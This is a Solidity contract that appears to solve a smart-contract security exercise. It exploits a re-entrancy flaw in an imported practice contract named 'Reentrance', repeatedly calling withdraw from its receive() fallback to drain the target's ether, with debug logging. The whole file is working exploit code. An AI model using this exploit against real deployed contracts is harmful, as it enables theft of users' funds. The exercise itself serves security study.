// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./11_Re_entrancy.sol";

contract Attack {
    Reentrance reentrance;

    constructor(address payable _reentrance) {
        reentrance = Reentrance(_reentrance);
    }

    function attack() external payable {
        // require(msg.value == TOKEN_AMOUNT, "Send at least 1 ether");
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
        console.log("Fifth");
    }

    receive() external payable {
        uint256 amount = msg.value <= address(reentrance).balance
            ? msg.value
            : address(reentrance).balance;
        console.log("First", amount);
        if (amount > 0) {
            console.log("Second");
            reentrance.withdraw(amount);
            console.log("Third");
        }
        console.log("Forth");
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
